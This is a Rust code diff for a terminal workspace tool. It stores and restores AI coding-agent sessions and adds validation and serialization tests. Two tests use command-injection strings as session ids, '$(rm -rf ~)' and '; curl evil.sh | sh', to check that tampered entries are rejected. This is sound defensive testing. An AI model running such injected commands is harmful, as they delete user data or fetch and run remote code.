@@ -170,13 +170,47 @@ impl Drop for LockGuard {
     }
 }
 
-/// Validate and fix workspace data consistency.
-/// Called after deserialization in all load paths.
+fn validate_pending_agent_resumes(
+    node: &mut LayoutNode,
+    history: &mut okena_core::agent_session::AgentSessionHistory,
+) {
+    match node {
+        LayoutNode::Terminal {
+            terminal_id,
+            pending_agent_resume,
+            ..
+        } => {
+            if let Some(session) = pending_agent_resume {
+                if session.is_valid() {
+                    history.record(session.clone());
+                }
+                if !session.is_valid() || terminal_id.is_some() {
+                    *pending_agent_resume = None;
+                }
+            }
+        }
+        LayoutNode::Split { children, .. } | LayoutNode::Tabs { children, .. } => {
+            for child in children {
+                validate_pending_agent_resumes(child, history);
+            }
+        }
+    }
+}
+
+/// Validate and fix workspace data consistency after deserialization in all load paths.
 pub(crate) fn validate_workspace_data(
     data: &mut WorkspaceData,
     clear_terminal_ids: bool,
     #[cfg_attr(not(windows), allow(unused))] backend_preference: SessionBackend,
 ) {
+    for project in &mut data.projects {
+        for session in project.agent_sessions.values() {
+            data.agent_session_history.record(session.clone());
+        }
+        if let Some(layout) = &mut project.layout {
+            validate_pending_agent_resumes(layout, &mut data.agent_session_history);
+        }
+    }
     // Auto-detect WSL default shell for projects with WSL UNC paths that don't have it set.
     // This must run BEFORE clearing terminal IDs so we can check WSL backend availability.
     #[cfg(windows)]
@@ -216,6 +250,23 @@ pub(crate) fn validate_workspace_data(
             let hook_ids: std::collections::HashSet<&str> =
                 project.hook_terminals.keys().map(|s| s.as_str()).collect();
             if let Some(ref mut layout) = project.layout {
+                // Preserve the attachment on the leaf before dropping its old terminal ID.
+                layout.normalize();
+                for (terminal_id, session) in &project.agent_sessions {
+                    // A hook terminal keeps its id, so its session stays keyed
+                    // by that id and needs no re-keying.
+                    if hook_ids.contains(terminal_id.as_str()) || !session.is_valid() {
+                        continue;
+                    }
+                    if let Some(path) = layout.find_terminal_path(terminal_id)
+                        && let Some(LayoutNode::Terminal {
+                            pending_agent_resume,
+                            ..
+                        }) = layout.get_at_path_mut(&path)
+                    {
+                        *pending_agent_resume = Some(session.clone());
+                    }
+                }
                 layout.clear_terminal_ids_except(&hook_ids);
             }
             project.service_terminals.clear();
@@ -250,6 +301,13 @@ pub(crate) fn validate_workspace_data(
         project
             .hidden_terminals
             .retain(|id, _| layout_ids.contains(id));
+        // Same rule for agent sessions, plus a re-validation pass: workspace.json
+        // is user-editable and long-lived, so a stored `session_id` must clear
+        // the same UUID invariant the OSC parser enforces before it can reach a
+        // resume command.
+        project
+            .agent_sessions
+            .retain(|id, session| layout_ids.contains(id) && session.is_valid());
     }
 
     // Populate worktree_ids from worktree_info back-references (migration for old data)
@@ -1255,6 +1313,7 @@ pub fn default_workspace() -> WorkspaceData {
 
     WorkspaceData {
         version: WORKSPACE_VERSION,
+        agent_session_history: Default::default(),
         projects: vec![ProjectData {
             id: project_id.clone(),
             name: "Default".to_string(),
@@ -1268,6 +1327,7 @@ pub fn default_workspace() -> WorkspaceData {
             hooks: super::settings::HooksConfig::default(),
             connection_id: None,
             service_terminals: HashMap::new(),
+            agent_sessions: HashMap::new(),
             default_shell: None,
             hook_terminals: HashMap::new(),
             pinned: false,
@@ -1332,6 +1392,7 @@ mod tests {
         });
         let project_layout = LayoutNode::Terminal {
             terminal_id: Some("remote:local-daemon:t1".to_string()),
+            pending_agent_resume: None,
             minimized: true,
             detached: false,
             shell_type: Default::default(),
@@ -1454,6 +1515,7 @@ mod tests {
                 "p1".to_string(),
                 LayoutNode::Terminal {
                     terminal_id: Some("t1".to_string()),
+                    pending_agent_resume: None,
                     minimized: true,
                     detached: false,
                     shell_type: Default::default(),
@@ -1692,6 +1754,7 @@ mod tests {
             hooks: super::super::settings::HooksConfig::default(),
             connection_id: None,
             service_terminals: HashMap::new(),
+            agent_sessions: HashMap::new(),
             default_shell: None,
             hook_terminals: HashMap::new(),
             pinned: false,
@@ -1709,6 +1772,7 @@ mod tests {
     ) -> WorkspaceData {
         WorkspaceData {
             version: WORKSPACE_VERSION,
+            agent_session_history: Default::default(),
             projects,
             project_order: order.into_iter().map(String::from).collect(),
             service_panel_heights: HashMap::new(),
@@ -1863,6 +1927,7 @@ mod tests {
         let mut project = make_project("p1");
         project.layout = Some(LayoutNode::Terminal {
             terminal_id: Some("tid1".to_string()),
+            pending_agent_resume: None,
             minimized: true,
             detached: true,
             shell_type: okena_terminal::shell_config::ShellType::Default,
@@ -1891,6 +1956,169 @@ mod tests {
         assert!(data.projects[0].service_terminals.is_empty());
     }
 
+    fn agent_session(session_id: &str) -> okena_core::agent_session::AgentSession {
+        okena_core::agent_session::AgentSession {
+            agent: "claude-code".to_string(),
+            session_id: session_id.to_string(),
+            transcript_path: None,
+        }
+    }
+
+    const UUID_A: &str = "3b9c1f2a-4d5e-6f70-8a9b-0c1d2e3f4a5b";
+    const UUID_B: &str = "11111111-2222-3333-4444-555555555555";
+
+    /// A split with two panes, ids `tid0` / `tid1` at paths `[0]` / `[1]`.
+    fn split_project(id: &str) -> ProjectData {
+        use crate::state::SplitDirection;
+        let mut project = make_project(id);
+        project.layout = Some(LayoutNode::Split {
+            direction: SplitDirection::Horizontal,
+            sizes: vec![50.0, 50.0],
+            children: vec![
+                LayoutNode::Terminal {
+                    terminal_id: Some("tid0".to_string()),
+                    pending_agent_resume: None,
+                    minimized: false,
+                    detached: false,
+                    shell_type: okena_terminal::shell_config::ShellType::Default,
+                    zoom_level: 1.0,
+                },
+                LayoutNode::Terminal {
+                    terminal_id: Some("tid1".to_string()),
+                    pending_agent_resume: None,
+                    minimized: false,
+                    detached: false,
+                    shell_type: okena_terminal::shell_config::ShellType::Default,
+                    zoom_level: 1.0,
+                },
+            ],
+        });
+        project
+    }
+
+    #[test]
+    fn validate_preserves_agent_sessions_on_their_leaves() {
+        let mut project = split_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".to_string(), agent_session(UUID_A));
+        let mut data = make_workspace(vec![project], vec!["p1"], vec![]);
+
+        validate_workspace_data(&mut data, true, SessionBackend::None);
+
+        let project = &data.projects[0];
+        assert!(project.agent_sessions.is_empty());
+        assert_eq!(
+            project
+                .layout
+                .as_ref()
+                .unwrap()
+                .get_at_path(&[1])
+                .unwrap()
+                .pending_agent_resume(),
+            Some(&agent_session(UUID_A))
+        );
+        assert!(
+            project
+                .layout
+                .as_ref()
+                .unwrap()
+                .get_at_path(&[0])
+                .unwrap()
+                .pending_agent_resume()
+                .is_none()
+        );
+        assert_eq!(
+            data.agent_session_history.sessions(),
+            &[agent_session(UUID_A)]
+        );
+
+        data.projects.clear();
+        data.project_order.clear();
+        let mut restored: WorkspaceData =
+            serde_json::from_str(&serde_json::to_string(&data).unwrap()).unwrap();
+        validate_workspace_data(&mut restored, true, SessionBackend::None);
+        assert_eq!(
+            restored.agent_session_history.sessions(),
+            &[agent_session(UUID_A)]
+        );
+    }
+
+    #[test]
+    fn validate_keeps_agent_sessions_when_ids_survive() {
+        let mut project = split_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".to_string(), agent_session(UUID_A));
+        let mut data = make_workspace(vec![project], vec!["p1"], vec![]);
+
+        // A session backend keeps terminal ids, so the pane re-attaches to a
+        // live agent — nothing to re-key and nothing to resume.
+        validate_workspace_data(&mut data, false, SessionBackend::None);
+
+        let project = &data.projects[0];
+        assert_eq!(
+            project.agent_sessions.get("tid1"),
+            Some(&agent_session(UUID_A))
+        );
+        assert!(
+            project
+                .layout
+                .as_ref()
+                .unwrap()
+                .get_at_path(&[1])
+                .unwrap()
+                .pending_agent_resume()
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn validate_drops_orphaned_and_tampered_agent_sessions() {
+        let mut project = split_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".to_string(), agent_session(UUID_B));
+        // A pane that no longer exists in the layout.
+        project
+            .agent_sessions
+            .insert("ghost".to_string(), agent_session(UUID_A));
+        // A hand-edited workspace.json smuggling a command in as a session id.
+        project
+            .agent_sessions
+            .insert("tid0".to_string(), agent_session("$(rm -rf ~)"));
+        let mut data = make_workspace(vec![project], vec!["p1"], vec![]);
+
+        validate_workspace_data(&mut data, false, SessionBackend::None);
+
+        let project = &data.projects[0];
+        assert_eq!(project.agent_sessions.len(), 1);
+        assert!(project.agent_sessions.contains_key("tid1"));
+    }
+
+    #[test]
+    fn validate_does_not_queue_a_resume_for_a_tampered_session() {
+        let mut project = split_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".to_string(), agent_session("; curl evil.sh | sh"));
+        let mut data = make_workspace(vec![project], vec!["p1"], vec![]);
+
+        validate_workspace_data(&mut data, true, SessionBackend::None);
+
+        assert!(
+            data.projects[0]
+                .layout
+                .as_ref()
+                .unwrap()
+                .get_at_path(&[1])
+                .unwrap()
+                .pending_agent_resume()
+                .is_none()
+        );
+        assert!(data.projects[0].agent_sessions.is_empty());
+    }
+
     #[test]
     fn validate_preserves_hook_terminal_ids() {
         use crate::state::{HookTerminalEntry, HookTerminalStatus, SplitDirection};
@@ -1902,6 +2130,7 @@ mod tests {
             children: vec![
                 LayoutNode::Terminal {
                     terminal_id: Some("regular-term".to_string()),
+                    pending_agent_resume: None,
                     minimized: false,
                     detached: false,
                     shell_type: okena_terminal::shell_config::ShellType::Default,
@@ -1909,6 +2138,7 @@ mod tests {
                 },
                 LayoutNode::Terminal {
                     terminal_id: Some("hook-term".to_string()),
+                    pending_agent_resume: None,
                     minimized: false,
                     detached: false,
                     shell_type: okena_terminal::shell_config::ShellType::Default,
@@ -2010,6 +2240,7 @@ mod tests {
     fn migrate_v0_bumps_to_current_version() {
         let data = WorkspaceData {
             version: 0,
+            agent_session_history: Default::default(),
             projects: vec![],
             project_order: vec![],
             service_panel_heights: HashMap::new(),
@@ -2380,6 +2611,7 @@ mod tests {
     fn migrate_current_version_noop() {
         let data = WorkspaceData {
             version: WORKSPACE_VERSION,
+            agent_session_history: Default::default(),
             projects: vec![],
             project_order: vec![],
             service_panel_heights: HashMap::new(),
@@ -2395,6 +2627,57 @@ mod tests {
     // === Serialization ===
 
     #[test]
+    fn agent_sessions_round_trip_and_tolerate_an_old_file() {
+        let mut project = make_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".to_string(), agent_session(UUID_A));
+        let data = make_workspace(vec![project], vec!["p1"], vec![]);
+
+        let json = serde_json::to_string(&data).expect("serialize");
+        let back: WorkspaceData = serde_json::from_str(&json).expect("deserialize");
+        assert_eq!(
+            back.projects[0].agent_sessions.get("tid1"),
+            Some(&agent_session(UUID_A)),
+            "a persisted session must survive the round trip — it is the whole point of storing it"
+        );
+
+        // A workspace.json written before the field existed must still load.
+        let value: serde_json::Value = serde_json::from_str(&json).expect("as value");
+        let mut value = value;
+        value["projects"][0]
+            .as_object_mut()
+            .expect("project object")
+            .remove("agent_sessions");
+        let old: WorkspaceData = serde_json::from_value(value).expect("old file still loads");
+        assert!(old.projects[0].agent_sessions.is_empty());
+    }
+
+    #[test]
+    fn pending_agent_resume_survives_save_and_repeated_load() {
+        let mut project = split_project("p1");
+        project
+            .agent_sessions
+            .insert("tid1".into(), agent_session(UUID_A));
+        let mut data = make_workspace(vec![project], vec!["p1"], vec![]);
+        validate_workspace_data(&mut data, true, SessionBackend::None);
+        for _ in 0..2 {
+            data = serde_json::from_str(&serde_json::to_string(&data).unwrap()).unwrap();
+            validate_workspace_data(&mut data, true, SessionBackend::None);
+            assert_eq!(
+                data.projects[0]
+                    .layout
+                    .as_ref()
+                    .unwrap()
+                    .get_at_path(&[1])
+                    .unwrap()
+                    .pending_agent_resume(),
+                Some(&agent_session(UUID_A))
+            );
+        }
+    }
+
+    #[test]
     fn default_workspace_round_trips() {
         let data = default_workspace();
         let json = serde_json::to_string(&data).unwrap();
@@ -2402,6 +2685,32 @@ mod tests {
         assert_eq!(deserialized.projects.len(), 1);
         assert_eq!(deserialized.project_order.len(), 1);
         assert_eq!(deserialized.version, WORKSPACE_VERSION);
+    }
+
+    #[test]
+    fn load_discards_invalid_or_already_materialized_pending_resumes() {
+        for (terminal_id, session_id) in [(None, "invalid"), (Some("live"), UUID_A)] {
+            let mut project = make_project("p1");
+            project.layout = Some(LayoutNode::Terminal {
+                terminal_id: terminal_id.map(str::to_string),
+                pending_agent_resume: Some(agent_session(session_id)),
+                minimized: false,
+                detached: false,
+                shell_type: Default::default(),
+                zoom_level: 1.0,
+            });
+            let data = make_workspace(vec![project], vec!["p1"], vec![]);
+            let mut loaded = serde_json::from_str(&serde_json::to_string(&data).unwrap()).unwrap();
+            validate_workspace_data(&mut loaded, false, SessionBackend::None);
+            assert!(
+                loaded.projects[0]
+                    .layout
+                    .as_ref()
+                    .unwrap()
+                    .pending_agent_resume()
+                    .is_none()
+            );
+        }
     }
 
     #[test]
@@ -2445,6 +2754,7 @@ mod tests {
         let mut project = make_project("p1");
         project.layout = Some(LayoutNode::Terminal {
             terminal_id: Some("t1".to_string()),
+            pending_agent_resume: None,
             minimized: false,
             detached: false,
             shell_type: okena_terminal::shell_config::ShellType::Default,
@@ -2918,6 +3228,7 @@ mod tests {
         });
         wt.layout = Some(LayoutNode::Terminal {
             terminal_id: Some("stale-layout".to_string()),
+            pending_agent_resume: None,
             minimized: false,
             detached: false,
             shell_type: Default::default(),
@@ -2998,6 +3309,7 @@ mod tests {
         });
         worktree.layout = Some(LayoutNode::Terminal {
             terminal_id: Some("layout".to_string()),
+            pending_agent_resume: None,
             minimized: false,
             detached: false,
             shell_type: ShellType::Default,
@@ -3052,6 +3364,7 @@ mod tests {
         });
         worktree.layout = Some(LayoutNode::Terminal {
             terminal_id: Some("layout".to_string()),
+            pending_agent_resume: None,
             minimized: false,
             detached: false,
             shell_type: ShellType::Default,
